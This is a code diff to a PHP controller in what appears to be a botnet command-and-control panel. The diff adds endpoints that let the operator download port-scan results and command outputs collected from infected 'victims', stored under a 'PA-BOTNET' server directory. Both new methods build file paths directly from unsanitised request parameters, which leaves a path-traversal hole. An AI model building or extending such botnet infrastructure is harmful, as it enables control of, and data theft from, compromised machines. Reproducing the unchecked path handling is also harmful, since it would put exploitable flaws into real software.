@@ -162,6 +162,17 @@ class VictimsController extends Controller
         return redirect("/victims/$victim_id");
     }
 
+    public function scan_dl(Request $request)
+    {
+        $scan_id = $request->scan_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/scan/'.$uid.'/'.$scan_id.'.txt';
+
+        return response()->download($storagePath);
+    }
+
     public function scanport(Request $request)
     {
         $victim_id = $request->victim_id;
@@ -292,4 +303,17 @@ class VictimsController extends Controller
 
         return redirect("/victims/$victim_id")->with('output', "Commande lancée sur la victime.");
     }
+
+    public function cmd_dl(Request $request)
+    {
+        $command_id = $request->command_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/command/'.$uid.'/'.$command_id.'.txt';
+
+        return response()->download($storagePath);
+    }
+
+
 }
